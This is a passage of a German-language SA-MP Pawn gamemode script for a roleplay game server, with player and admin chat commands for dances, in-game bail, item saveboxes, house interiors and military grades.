		 OnePlayAnim(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
		 MakeAnimation[playerid] = 1;
         return 1;
    }
 	if(strcmp(cmd, "/dance", true) == 0)
 	{
      		tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp) || strlen(tmp) > 2)
			{
				SendClientMessage(playerid,COLOR_GRAD1,"Benutzung: /dance [1-4]");
				return 1;
			}
			dancestyle = strval(tmp);
			if(dancestyle < 1 || dancestyle > 4)
			{
			    SendClientMessage(playerid,COLOR_GRAD1,"Benutzung: /dance [1-4]");
			    return 1;
			}
			if(dancestyle == 1)
			{
			    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
				MakeAnimation[playerid] = 1;
			}
			else if(dancestyle == 2)
			{
			    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
				MakeAnimation[playerid] = 1;
			}
			else if(dancestyle == 3)
			{
		    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
			MakeAnimation[playerid] = 1;
			}
			else if(dancestyle == 4)
			{
			    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
				MakeAnimation[playerid] = 1;
			}
 	  		return 1;
	}

 	if(strcmp(cmd, "/explosion", true) == 0)
	{
		GetPlayerName(playerid, sendername, sizeof(sendername));
		tmp = strtoknew(cmdtext, idx);
		if(!strlen(tmp) && PlayerInfo[playerid][pAdmin] >= 1338)
		{
			SendClientMessage(playerid, COLOR_GREY, "/explosion [Playerid]");
			return 1;
		}
		giveplayerid = strval(tmp);
		GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Admin!");
		    return 1;
		}
		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[playerid][pAdmin] >= 1337)
			{
				new giveplayerid1[30];
				if(IsPlayerConnected(giveplayerid))
				{
					format(string, sizeof(string), "* Admin %s hat dich auf Heal-Hack überprüft", sendername);
                    SendClientMessage(giveplayerid, COLOR_RED, string);
					SetPlayerHealth(giveplayerid, 10);
					new Float:boomx, Float:boomy, Float:boomz;
					GetPlayerPos(giveplayerid,boomx, boomy, boomz);
					CreateExplosion(boomx, boomy , boomz, 7, 10);
                    GetPlayerName(giveplayerid, giveplayerid1, sizeof(giveplayerid1));
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    format(string, sizeof(string), "AdmCmd: %s hat %s auf Heal-Hack überprüft!",sendername, giveplayerid1);
                    ABroadCast(COLOR_LIGHTRED,string,1);
					printf("[Command] %s has used /explode to explode %s", sendername, giveplayerid1);
				}
				else
				{
					format(string, sizeof(string), "Der Spieler %s ist nicht online!", giveplayerid1);
					SendClientMessage(playerid, COLOR_RED, string);
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_RED, "Du kannst diesen Befehl nicht benutzen!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_RED, "Du musst eingelogt sein um den Befehl nutzen zu können!");
		}
		return 1;
	}
	if(strcmp(cmd, "/lawyer", true) == 0 || (strcmp(cmd, "/anwälte", true) == 0))
	{
    	if(IsPlayerConnected(playerid))
		{
			SendClientMessage(playerid, COLOR_WHITE, "|____ Anwälte Online ____|");
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					if(PlayerInfo[i][pJob] == 2)
					{
						GetPlayerName(i, sendername, sizeof(sendername));
						format(string, 256, "Anwalt: %s |Tel: %d|", sendername, PlayerInfo[i][pPnumber]);
						SendClientMessage(playerid, COLOR_GRAD2, string);
					}
				}
			}
		}
		return 1;
	}
	if(strcmp(cmdtext,"/Klingeln",true) == 0)
	{
    	if(IsPlayerInRangeOfPoint(playerid,3.0,240.9979,112.8959,1003.2188))
    	{
            ShowPlayerDialog(playerid, DIALOG_KLINGEL, DIALOG_STYLE_LIST, "Klingel", "Ich bin Anwalt\nIch möchte mich stellen\nIch brauche Hilfe", "Auswahl", "Abbrechen");
		}
	}
	if(strcmp(cmd, "/startbonus", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pLevel] <3)
			{
			    if(TutorialGemacht[playerid] == 0)
			    {
			        if(PlayerInfo[playerid][pLevel]>=2) return SCM(playerid,-1,"Du hast deinen Startbonus bereits erhalten!");
			        if(StartBonusErhalten[playerid] == 1) return SCM(playerid,-1,"Du hast deinen Startbonus bereits erhalten!");
                    format(string, sizeof(string), "* Du hast den Startbonus bekommen. (Level: 2,Geld: +$50.000).");
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Wir wünschen dir weiterhin viel Spaß beim Spielen auf GTA-City Reallife",sendername);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			    	GivePlayerMoneySave(playerid, 50000);  /// Geld was der Spieler bekommt
			    	PlayerInfo[playerid][pLevel] = 2;
			    	StartBonusErhalten[playerid] = 1;

			    	return 1;
				}
				if(StartBonusErhalten[playerid] == 1) return SCM(playerid,-1,"Du hast deinen Startbonus bereits erhalten!");
				StartBonusErhalten[playerid] = 1;
				format(string, sizeof(string), "* Du hast den Startbonus bekommen. (Level: 3, Geld: +$50.000).");
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Wir wünschen dir weiterhin viel Spaß beim Spielen auf GTA-City Reallife",sendername);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			    GivePlayerMoneySave(playerid, 50000);  /// Geld was der Spieler bekommt
				PlayerInfo[playerid][pLevel] = 3; // Level was der Spieler bekommt
//				ShowPlayerDialog(playerid, DIALOG_NEULINGSFRAK, DIALOG_STYLE_LIST, "Wähle eine Fraktion aus", "Keine Fraktion\nLSPD\nFBI\nBundeswehr\nSanitäter\nLCM\nYakuza\nPräsident\nHitman\nSan News\nTransport Gmbh\nFahrlehrer\nTriaden\nGS\nBallas\nLS Vagos\nAztecas\nSF Rifa\nRS\nTerror\nWheelman\nSWAT\nRussen\nOrdnungsamt", "Auswählen", "Abbrechen");
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD2, "Du bist kein Anfänger mehr!");
			    return 1;
			}

		}
		return 1;
	}
	if(strcmp(cmd, "/free", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
		    if(PlayerInfo[playerid][pJob] != 2)
		    {
		        SendClientMessage(playerid, COLOR_GREY, "Du bist kein Anwalt!");// /klingen label
		        return 1;
		    }
		    if(!IsPlayerInRangeOfPoint(playerid, 7.0, 256.8279,69.4461,1003.6406)||IsPlayerInRangeOfPoint(playerid, 7.0,246.5717,118.1915,1003.2188))
		    {
		    	SendClientMessage(playerid,COLOR_GRAD2,"Du bist nicht im LSPD / FBI!");
				return 1;
		    }
	    	tmp = strtoknew(cmdtext, idx);// IsPlayerInRangeOfPoint
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /free [playerid] [kaution]");
				return 1;
			}
			new result2;
			giveplayerid = ReturnUser(tmp);
			result2 = strval(tmp);
			if(IsPlayerConnected(giveplayerid))
			{
			        if(giveplayerid != INVALID_PLAYER_ID)
			        {
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
	                    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dich nicht selber befreien!"); return 1; }
						if(PlayerInfo[giveplayerid][pJailTime] >=1)
						{
							format(string, sizeof(string), "* Anwalt %s bietet dir an dich für %d Doller aus dem Knast zu befreien.", sendername,result2);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* Du hast %s angeboten ihn für %d Doller aus dem Knast zu befreien.", giveplayer,result2);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "* Tippte /accept kaution!");
							AnwaltPreis[giveplayerid] = result2;
							AnwaltStatus[giveplayerid] = playerid;
						}
						else
						{
							SendClientMessage(playerid, COLOR_GRAD1, "Spieler ist nicht im Jail oder braucht keinen Anwalt!");
						}
						return 1;
					}
			}
			else
			{
				format(string, sizeof(string), "   %d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
    //============LICHT================//
	if(strcmp(cmdtext,"/licht",true)==0)
		 {
		    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
		    new engine,lights,alarm,doors,bonnet,boot,objective;
		     new vid = GetPlayerVehicleID(playerid);
		  GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
		  if(vid != INVALID_VEHICLE_ID)
		  {
			  if(engine == VEHICLE_PARAMS_ON)
			  {
			     if(lights == VEHICLE_PARAMS_ON)
			     {
			       SetVehicleParamsEx(vid,engine,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
			       SendClientMessage(playerid,COLOR_GREY,"Licht ausgeschaltet.  ");
			  	 }
			     else
			     {
			       SetVehicleParamsEx(vid,engine,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
			       SendClientMessage(playerid,COLOR_GREY,"Licht eingeschaltet..  ");
			     }
			}
			else
			  {
			       SendClientMessage(playerid,COLOR_GREY,"Du musst erst den Motor einschalten ..  ");
				return 1;
			}
		}
		return 1;
	}
    //============================ SaveBox ===============================//
	if(strcmp(cmd,"/put",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
     		if(PlayerToPoint(10.0,playerid,837.04510, -1852.74292, 7.83975) || PlayerToPoint(10.0,playerid,1298.18994, -985.38837, 32.09094) || PlayerToPoint(10.0,playerid,1097.73157, 1675.44006, 5.15633)|| PlayerToPoint(10.0,playerid,-1480.28186, 315.40509, 6.54263))
    		{
               new x_nr[256];
			   x_nr = strtoknew(cmdtext, idx);
			   if(!strlen(x_nr)) {
			      SendClientMessage(playerid, COLOR_WHITE, "|__________________ Put __________________|");
				  SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /put [NAME]");
				  SendClientMessage(playerid, COLOR_GREY, "Verfügbare Namen: Mats, Drogen");
				  SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
				  return 1;
			   }
	           if(strcmp(x_nr,"Mats",true) == 0)
			   {
			      tmp = strtoknew(cmdtext, idx);
			      if(!strlen(tmp))
			      {
				     SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /put mats [Menge]");
				     format(string, sizeof(string), "  Du hast %d Mats bei dir.", PlayerInfo[playerid][pMats]);
				     SendClientMessage(playerid, COLOR_GRAD3, string);
				     return 1;
			      }
                  new matss;
                  matss = strval(tmp);
                  if(!strlen(tmp))
			      {
				     SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /put mats [Menge]");
				     format(string, sizeof(string), "  Du hast %d Materialien bei dir.", PlayerInfo[playerid][pMats]);
				     SendClientMessage(playerid, COLOR_GRAD3, string);
				     return 1;
			      }
				  if(matss < 1 || matss > 1000000)
				  {
					  SendClientMessage(playerid, COLOR_GRAD1, "Der Betrag muss zwischen 1 und 1000000 sein!");
					  return 1;
				  }
                  if(matss > PlayerInfo[playerid][pMats])
                  {
                     SendClientMessage(playerid, COLOR_GRAD2, "   So viele Materialien hast du nicht!");
                     return 1;
                  }
                  PlayerInfo[playerid][pMats] -= matss;
                  PlayerInfo[playerid][pBoxMats] += matss;
                  format(string, sizeof(string), "   %d Materialien in die Savebox gelegt!", matss);
                  SendClientMessage(playerid, COLOR_GRAD4, string);
                  return 1;
			   }
			   else if(strcmp(x_nr,"Drogen",true) == 0)
		 	   {
                  tmp = strtoknew(cmdtext, idx);
			      if(!strlen(tmp))
			      {
				     SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /put drogen [Menge]");
				     format(string, sizeof(string), "  Du hast %d Drogen bei dir.", PlayerInfo[playerid][pDrugs]);
				     SendClientMessage(playerid, COLOR_GRAD3, string);
				     return 1;
			      }
                  new drugss;
                  drugss = strval(tmp);
                  if(!strlen(tmp))
			      {
				     SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /put drogen [Menge]");
				     format(string, sizeof(string), "  Du hast %d Drogen bei dir.", PlayerInfo[playerid][pDrugs]);
				     SendClientMessage(playerid, COLOR_GRAD3, string);
				     return 1;
			      }
				  if(drugss < 1 || drugss > 1000000)
				  {
					  SendClientMessage(playerid, COLOR_GRAD1, "Der Betrag muss zwischen 1 und 1000000 sein!");
					  return 1;
				  }
                  if(drugss > PlayerInfo[playerid][pDrugs])
                  {
                     SendClientMessage(playerid, COLOR_GRAD2, "   So viele Drogen hast du nicht!");
                     return 1;
                  }
                  PlayerInfo[playerid][pDrugs] -= drugss;
                  PlayerInfo[playerid][pBoxDrugs] += drugss;
                  format(string, sizeof(string), "   %d Drogen in die Savebox gelegt!", drugss);
                  SendClientMessage(playerid, COLOR_GRAD4, string);
                  return 1;
               }
               }
               else
			   {
				SendClientMessage(playerid, COLOR_RED, "   Du bist an keiner Savebox!");
	            return 1;
 			}
        }
		return 1;
	}
	if(strcmp(cmd,"/stake",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
            if(PlayerToPoint(10.0,playerid,-363.85308838,-1430.48315430,24.72656250) || PlayerToPoint(10.0,playerid,2133.82666016,-1787.04248047,12.52786732) || PlayerToPoint(10.0,playerid,2805.2058,-1418.9055,16.2500) || PlayerToPoint(10.0, playerid, 836.9014,-1853.4141,6.4093))
            {
               new x_nr[256];
			   x_nr = strtoknew(cmdtext, idx);
			   if(!strlen(x_nr)) {
			      SendClientMessage(playerid, COLOR_WHITE, "|__________________ sTake __________________|");
				  SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /stake [NAME]");
				  SendClientMessage(playerid, COLOR_GREY, "Verfügbare Namen: Mats, Drogen");
				  SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
				  return 1;
			   }
	           if(strcmp(x_nr,"Mats",true) == 0)
			   {
                  tmp = strtoknew(cmdtext, idx);
			      if(!strlen(tmp))
			      {
				     SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /stake mats [Menge]");
				     format(string, sizeof(string), "  Du hast %d Materialien in deiner Savebox.", PlayerInfo[playerid][pBoxMats]);
				     SendClientMessage(playerid, COLOR_GRAD3, string);
				     return 1;
			      }
                  new matss;
                  matss = strval(tmp);
                  if(!strlen(tmp))
			      {
				     SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /stake Mats [Menge]");
				     format(string, sizeof(string), "  Du hast %d Materialien in der Savebox.", PlayerInfo[playerid][pBoxMats]);
				     SendClientMessage(playerid, COLOR_GRAD3, string);
				     return 1;
			      }
                  if(matss > PlayerInfo[playerid][pBoxMats])
                  {
                     SendClientMessage(playerid, COLOR_GRAD2, "   So viele Materialien hast du nicht!");
                     return 1;
                  }
                  PlayerInfo[playerid][pBoxMats] -= matss;
                  PlayerInfo[playerid][pMats] += matss;
                  format(string, sizeof(string), "   %d Materialien genommen!", matss);
                  SendClientMessage(playerid, COLOR_GRAD4, string);
                  return 1;
			   }
			   else if(strcmp(x_nr,"Drogen",true) == 0)
		 	   {
                  tmp = strtoknew(cmdtext, idx);
			      if(!strlen(tmp))
			      {
				     SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /stake drogen [Menge]");
				     format(string, sizeof(string), "  Du hast %d Drogen in deiner Savebox.", PlayerInfo[playerid][pBoxDrugs]);
				     SendClientMessage(playerid, COLOR_GRAD3, string);
				     return 1;
			      }
                  new drugss;
                  drugss = strval(tmp);
                  if(!strlen(tmp))
			      {
				     SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /stake drogen [Menge]");
				     format(string, sizeof(string), "  Du hast %d Drogen in der Savebox.", PlayerInfo[playerid][pBoxDrugs]);
				     SendClientMessage(playerid, COLOR_GRAD3, string);
				     return 1;
			      }
                  if(drugss > PlayerInfo[playerid][pBoxDrugs])
                  {
                     SendClientMessage(playerid, COLOR_GRAD2, "   So viele Drogen hast du nicht!");
                     return 1;
                  }
                  PlayerInfo[playerid][pBoxDrugs] -= drugss;
                  PlayerInfo[playerid][pDrugs] += drugss;
                  format(string, sizeof(string), "   %d Drogen aus der Savebox genommen", drugss);
                  SendClientMessage(playerid, COLOR_GRAD4, string);
                  return 1;
               }
            }
			else
			{
				SendClientMessage(playerid, COLOR_RED, "Du bist an keiner Savebox!");
	            return 1;
 			}
        }
		return 1;
	}

/*

    if(strcmp(cmd, "/players", true) == 0)// Backup Command defekt
	{
		if (PlayerInfo[playerid][pAdmin] > 3)
		{
			new s3tring[5000];
  			for(new i = 0; i < MAX_PLAYERS; i++)
   			{
	    		if(IsPlayerConnected(i))
	    		{
						new IP[32],country[32],countryy[32], countrys[32];

						GetPlayerIp(i, IP, sizeof(IP));


					 	GetIPCountry(IP, country, 32);

					 	GetIPISP(IP, countryy, 32);//GetPlayerIp(giveplayerid,playersip,sizeof(playersip));

               			format(s3tring, sizeof(s3tring), "%sSpieler: %s - IP: %s - Land: %s - Stadt: %s - Provider: %s\n", s3tring,GetName(i),IP,country,countrys,countryy);
				}
			}
			ShowPlayerDialog(playerid, 5167, DIALOG_STYLE_MSGBOX, "Spieler", s3tring, "Schliessen", "");
		}
		return 1;
	}
*/
    if(strcmp(cmd, "/moneys", true) == 0)
	{
		if (PlayerInfo[playerid][pAdmin] > 3)
		{
			new s3tring[5000];
  			for(new i = 0; i < MAX_PLAYERS; i++)
   			{
	    		if(IsPlayerConnected(i))
	    		{
               		 format(s3tring, sizeof(s3tring), "%sSpieler: %s - Bargeld: %d - Konto: %d\n", s3tring,GetName(i),PlayerInfo[i][pCash],PlayerInfo[i][pAccount]);
				}
			}
			ShowPlayerDialog(playerid, 5167, DIALOG_STYLE_MSGBOX, "Geld von den Spielern", s3tring, "Schliessen", "");
		}
		return 1;
	}
    if(strcmp(cmd, "/givedrugs", true) == 0)
	{
		if (PlayerInfo[playerid][pAdmin] == 2002)
		{
	    	if(IsPlayerConnected(playerid))
	    	{
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /givedrugs [playerid/PartOfName] [amount]");
					return 1;
				}
				//giveplayerid = strval(tmp);
	        	giveplayerid = ReturnUser(tmp);
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /givedrugs [playerid/PartOfName] [amount]");
					return 1;
				}
				new playa;
				GetPlayerName(playa, sendername, sizeof(sendername));
				playa = ReturnUser(tmp);
				moneys = strval(tmp);
		    	PlayerInfo[giveplayerid][pDrugs] = moneys;
			    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, 256, "AdmWarning: %s hat %s %d Drogen gegeben.", sendername,giveplayer,moneys);
				ABroadCast(COLOR_YELLOW,string,1);
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/givemats", true) == 0)
	{
		if (PlayerInfo[playerid][pAdmin] == 2002)
		{
	    	if(IsPlayerConnected(playerid))
	    	{
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /givemats [playerid/PartOfName] [amount]");
					return 1;
				}
				//giveplayerid = strval(tmp);
	        	giveplayerid = ReturnUser(tmp);
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /givemats [playerid/PartOfName] [amount]");
					return 1;
				}
				new playa;
				GetPlayerName(playa, sendername, sizeof(sendername));
				playa = ReturnUser(tmp);
				moneys = strval(tmp);
		    	PlayerInfo[giveplayerid][pMats] = moneys;
			    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, 256, "AdmWarning: %s hat %s %d Materialien gegeben.", sendername,giveplayer,moneys);
				ABroadCast(COLOR_YELLOW,string,1);
			}
		}
		return 1;
	}

//--------------------------------------------------------Haus interiors erstellen--------------------------------------------------------//

    if(strcmp(cmd, "/sethouseinterior", true) == 0) // 12 Ersetzen
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] < 1338)
            {
                SendClientMessage(playerid, COLOR_RED, "Du bist kein Administrator!");
                return 1;
            }
            new x_job[256];
            new Float:HX, Float:HY, Float:HZ, hInterior;
            x_job = strtoknew(cmdtext, idx);
            if(!strlen(x_job))
			{
                SendClientMessage(playerid, COLOR_WHITE, "=========== [/sethouseinterior] ===========");
                SendClientMessage(playerid, COLOR_RED, "FEHLER: /sethouseinterior [1 - 5]");
                SendClientMessage(playerid, COLOR_GREY, "Interiors: 1 Standart, 2 Holzhütte, 3 Mittel Luxus");
                SendClientMessage(playerid, COLOR_GREY, "4 Luxus Villa, 5 Holzhütte Edel, 6 Jefferson Motel");
                return 1;
            }
            for(new i = 0; i < sizeof(HouseInfo); i++)
            {
                if (IsPlayerInRangeOfPoint(playerid,1,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
                {
                    	format(string, sizeof(string), "House: %d", i);
                   		SendClientMessage(playerid, COLOR_GRAD2, string);


                        if(strcmp(x_job,"1",true) == 0)
                        {
                            HX = 244.5000; HY = 305.0000; HZ = 999.1484; hInterior = 1;
                        }
                        else if(strcmp(x_job,"2",true) == 0)
                        {
                            HX = 301.3000; HY = 306.0000; HZ = 1003.5391; hInterior = 4;
                        }
                        else if(strcmp(x_job,"3",true) == 0)
                        {
                            HX = -42.5674; HY = 1406.0640; HZ = 1084.4297; hInterior = 8;
                        }
                        else if(strcmp(x_job,"4",true) == 0)
                        {
                            HX = 23.9657; HY = 1340.6852; HZ = 1084.3750; hInterior = 10;
                        }
                        else if(strcmp(x_job,"5",true) == 0)
                        {
                            HX = 223.0092; HY = 1287.6935; HZ = 1082.1406; hInterior = 1;
                        }
                        else if(strcmp(x_job,"6",true) == 0)
                        {
                            HX = 2214.6282; HY = -1150.4385; HZ = 1025.7969; hInterior = 15;
                        }
/*
                        else if(strcmp(x_job,"6",true) == 0)
                        {
                            HX = -42.4000; HY = 1408.2000; HZ = 1084.4297; hInterior = 8;
                        }
                        else if(strcmp(x_job,"7",true) == 0)
                        {
                            HX = 2468.2161; HY = -1698.1252; HZ = 1013.5078; hInterior = 2;
                        }
                        else if(strcmp(x_job,"8",true) == 0)
                        {
                            HX = 386.1000; HY = 1471.8000; HZ = 1080.1875; hInterior = 15;
                        }
                        else if(strcmp(x_job,"9",true) == 0)
                        {
                            HX = 221.8930; HY = 1140.8698; HZ = 1082.6094; hInterior = 4;
                        }
                        else if(strcmp(x_job,"10",true) == 0)
                        {
                            HX = 260.6000; HY = 1238.8000; HZ = 1084.2578; hInterior = 9;
                        }
                        else if(strcmp(x_job,"11",true) == 0)
                        {
                            HX = 261.0000; HY = 1286.0000; HZ = 1080.2578; hInterior = 4;
                        }
                        else if(strcmp(x_job,"12",true) == 0)
                        {
                            HX = 1261.5873; HY = -785.3129; HZ = 1091.9063; hInterior = 5;
//                            return 1;
                        }
                        else if(strcmp(x_job,"13",true) == 0)
                        {
                            HX = 376.3000; HY = 1417.2000; HZ = 1081.3281; hInterior = 15;
                        }
                        else if(strcmp(x_job,"14",true) == 0)
                        {
                            HX = 27.1000; HY = 1341.1000; HZ = 1084.3750; hInterior = 10;
                        }
                        else if(strcmp(x_job,"15",true) == 0)
                        {
                            return 1;
                        }
                        else if(strcmp(x_job,"16",true) == 0)
                        {
                            HX = 222.8000; HY = 1288.7000; HZ = 1082.1406; hInterior = 1;
                        }
                        else if(strcmp(x_job,"17",true) == 0)
                        {
                            HX = 23.0000; HY = 1405.6000; HZ = 1084.4297; hInterior = 5;
                        }
                        else if(strcmp(x_job,"18",true) == 0)
                        {
                            HX = 235.3000; HY = 1189.2000; HZ = 1080.2578; hInterior = 3;
                        }
                        else if(strcmp(x_job,"19",true) == 0)
                        {
                            HX = 447.0000; HY = 1400.3000; HZ = 1084.3047; hInterior = 2;
                        }
                        else if(strcmp(x_job,"20",true) == 0)
                        {
                            HX = 234.2000; HY = 1064.9000; HZ = 1084.2106; hInterior = 6;
                        }
                        else if(strcmp(x_job,"21",true) == 0)
                        {
                            HX = 327.9000; HY = 1478.3000; HZ = 1084.4375; hInterior = 15;
                        }
                        else if(strcmp(x_job,"22",true) == 0)
                        {
                            HX = 295.4000; HY = 1473.2000; HZ = 1080.2578; hInterior = 15;
                        }
                        else if(strcmp(x_job,"23",true) == 0)
                        {
                            HX = 140.4000; HY = 1370.3000; HZ = 1083.8656; hInterior = 5;
                        }
                        else if(strcmp(x_job,"24",true) == 0)
                        {
                            HX = 489.7000; HY = 1402.5000; HZ = 1080.2645; hInterior = 2;
                        }
*/
                        HouseInfo[i][hExitx] = HX; HouseInfo[i][hExity] = HY; HouseInfo[i][hExitz] = HZ; HouseInfo[i][hInt] = hInterior;
                        SaveProperty(i);
				}
            }
            SendClientMessage(playerid, COLOR_WHITE,"HausInterior erfolgreich geändert!");
            return 1;
		}
	}
//----------------------------------[GWD machen]-----------------------------------------------

    if(strcmp(cmd, "/setgwd", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtoknew(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "Info: /setgwd [SpielerID] [Note]");
                return 1;
            }
            new playa;
            new Float:gwd;
            playa = ReturnUser(tmp);
            tmp = strtoknew(cmdtext, idx);
            gwd = strval(tmp);
            if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 3 && PlayerInfo[playerid][pRank] == 9)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        PlayerInfo[playa][pGWD] = gwd;
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "   Du hast %s die Note %f gegeben.", giveplayer, gwd);
                        SendClientMessage(playerid, COLOR_GRAD1, string);
                        format(string, sizeof(string), "   %s hat dir deine GWD-Note gegeben. Note: %f.", sendername, gwd);
                        SendClientMessage(playa, COLOR_GRAD1, string);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD1, "   Du bist kein Bundeswehrleader!");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/showgwd", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(gPlayerLogged[playerid] == 0)
            {
                SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht eingeloggt !");
                return 1;
            }
            tmp = strtoknew(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_WHITE, "Info: /showgwd [SpielerID]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        if(ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                                format(string, sizeof(string), "   Du hast %s deine GWD-Note gezeigt.", giveplayer);
                                SendClientMessage(playerid, COLOR_WHITE, string);
                                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "|_______________Grundwehrdienst-Note______________|");
                                format(string, sizeof(string), "   Name: %s   Note: %f", sendername, PlayerInfo[playerid][pGWD]);
                                SendClientMessage(giveplayerid, COLOR_WHITE, string);
                                SendClientMessage(giveplayerid, COLOR_WHITE, "___________________________________________________");
                                format(string, sizeof(string), "   %s zeigt dir seine GWD-Note.", sendername);
                                SendClientMessage(giveplayerid, COLOR_WHITE, string);
                                return 1;
                            }
                    }
                }
        }
        return 1;
    }

    if(strcmp(cmd, "/forumunban", true) == 0)
    {
	    if(PlayerInfo[playerid][pAdmin] > 4)
	    {
        if(IsPlayerConnected(playerid))
        {
            if(gPlayerLogged[playerid] == 0)
            {
                SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht eingeloggt !");
                return 1;
            }
            tmp = strtoknew(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_WHITE, "Info: /forumunban [SpielerID]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                    {
					WBB_UnbanUsername(GetName(giveplayerid));
	                format(stringx, sizeof(stringx), "* Dein Forumaccount wurde entsperrt!");
	                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, stringx);
	                format(stringx, sizeof(stringx), "Admin %s hat den Forumaccount von %s entbannt!", MeinName(playerid), MeinName(giveplayerid));
	                ABroadCast(COLOR_LIGHTRED, stringx, 1);
                    return 1;
                    }
                }
        }
        }
        return 1;
    }
    if(strcmp(cmd, "/gwd", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, "|_______________Grundwehrdienst-Note______________|");
	        format(string, sizeof(string), "  Deine GWD-Note ist %f.",PlayerInfo[playerid][pGWD]);
	        SendClientMessage(playerid, COLOR_WHITE, string);
	        SendClientMessage(playerid, COLOR_WHITE, "___________________________________________________");
        }
        return 1;
    }
	if(strcmp(cmd, "/respawncar", true) == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] < 4)
	    {
